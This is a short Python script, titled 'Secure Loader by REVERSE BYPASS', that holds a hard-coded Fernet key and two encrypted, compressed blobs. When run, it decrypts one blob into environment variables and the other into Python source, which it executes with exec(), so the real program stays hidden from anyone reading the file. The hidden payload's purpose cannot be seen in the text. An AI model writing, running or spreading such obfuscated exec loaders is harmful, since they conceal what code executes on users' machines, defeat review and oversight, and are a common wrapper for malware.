import os
import base64
import zlib
from cryptography.fernet import Fernet

# Secure Loader by REVERSE BYPASS
_k = b'kP_wSRxiatTfOhN9yMjBHEMchO9zkV5xrBNZnt9zcIQ='
_f = Fernet(b'kP_wSRxiatTfOhN9yMjBHEMchO9zkV5xrBNZnt9zcIQ=')
_e = b'gAAAAABpfjIzO3Mbej6zx2VuGa5VAcNyxQGQ-KPWDsPblAvD9nS5IPPsIILQ1NwgZsVkVXQovzgg28jbbcxwUfvm6Pk2UvhaaNCAgp0jE0le7zy_RXK_lRwFv4sLTc8TZ4O8r5h4WUAQrW-6Qro6Ffv3mFY3fX8SW5gScBgat5x1amLpim08hMKaonjgVjT6EZTvFko-Ki5stipoWPxbXFfr_blHsEXsZcA6k61Xz2mWx3-n91pzSepQ2_g1jgP-wB-nSE2l7MpwF71bDsE2umUJNXbhy4ziL3sAOl54R-zc8Juvi1V1DE9ugYhjWFIJlzhTklLWGa6yyrP9PBHuNSxo6-yxuN3KBQ=='
_b = b'gAAAAABpfjIzKESFnf4MnVyDKSZfJd_IbUvOgJpjcaraueBT8Bz2gMwgepufV9THTZy55rlKjhlj2jH52l2upDmQ63qEPpAMy_Wj0saQmuoqQiYFYAjYe9vy8L_1tKO3wRAnSGb8wzEGXMR7nndaQjTcZHNGElp982lug6gl-sc47wxWVgGSqOTbG22ZDwDl2tjCmAtODAjCpSb_cN_h6gyR7g79mrah8q-K6f8B5XznZtOl-jcM40N-9YuextEnsr-VrKneSLmWg-frhDJwgs9Ry2mc0RZV1Apgp4NrY-iTQO4B_WyT2dGCzUAGw6rRj2YmgAGX69GDYO8Mtr6Mj9hW_YaG_gzkDaD0NuT7gEUffWUydtTlWNj0W6J_Ud8z5KR5SYzDprQLDDSVDCmhyGAjxQvnES__ElYiIeh50P2iSdobNztBcx0ThxI_milbcESuTEMHCIit3rel6uuKDVCIUhuxQpGW2Rx1CGStpnw0XKMapT-aL7tJB0FoS-oQvLa4uLMLMhFuiu5-57ahoskY5zsjn9BBaMyXqv-_klHZ3xTUcgDStvubureseKzm9cDiRAJKtmwgrptpwROiEFA00y8gNemaKPN5Rokb8SfV0zHZDIBNjSYC3paigo06VccRqoK17QULRgKCmZIGSCkn8IwbhlY7BbaEhx0yf0ng_Uk-TQd0jwjJzQ3Ic16EsBgUGjqsuOKTS5dTnsXs67d4N1UZdx5vrWJZV7DrOp4C9HUleRyELIArh4lzxJ1XUyMTcNYqBEmT7dmcH1CB_BGUl3XzyKBbfSRsZgx_QmOddQCVZOZzVyAp_9CUboPNv-UIUl2Nyp2lJq-uDyyLl9ZGERkLxHRY7SvxHrRPd6SDLpX8XfyFMKMI159xJjyUzh4xywsVmuSxyngP2OZAZJzCQUhcr9GPlnxweccE-s_hQRD_2aSEsB8eNDpDKpIkJHkduF0ZLyaI8rKyy6VlZKMJC-MVDAewdoWAwXD-rNCmr0owAKWwIv-X_gEG354Hzwpi5sLESwnNTyhJmlZNy5DSGtH6SLonaZB9OfAgY9Hi27vwBIkh6kWKc6Db6W-3iIKu0r26VkOAcKhenO1oHcuoTq9sR34dIdZr4FTC6eKSep_tlDadMW9PN50yGoXyagK6vAlB6JhlhpV5ok3B0pOqX5VwP7icO0Kq5B9rSDNXWlmLpCMRtFXeQrOPeckGWFSfmo1w-QBuIQQv_y-exKIUcEMnMgpwcpadPN0Li4zLL0EB0j5-IKh0ARija42-uG7PL4a0mz6HIqc7_SIOIumd9Yne4cXs5XgcO7PcHu7EIdiByhXBYk6j0I3leE2Fr_vHL5Pma44B_PMZMoQ9J4PlO_oG446y0wkNqa5GzVsX8UlcCkPY5h83PaokNKjm3sOzKPcLkJ3eKdjHMST0ONKL_Wg6I6VKqvBpH1em4_uI8_GO5ggDIlA='

def _load():
    try:
        env = zlib.decompress(_f.decrypt(_e)).decode()
        for line in env.strip().split("\n"):
            if "=" in line:
                k, v = line.split("=", 1)
                os.environ[k.strip()] = v.strip()
    except Exception as e:
        print("Env Error:", e)
    
    try:
        code = zlib.decompress(_f.decrypt(_b)).decode()
        exec(code, globals())
    except Exception as e:
        print("Runtime Error:", e)

if __name__ == "__main__":
    _load()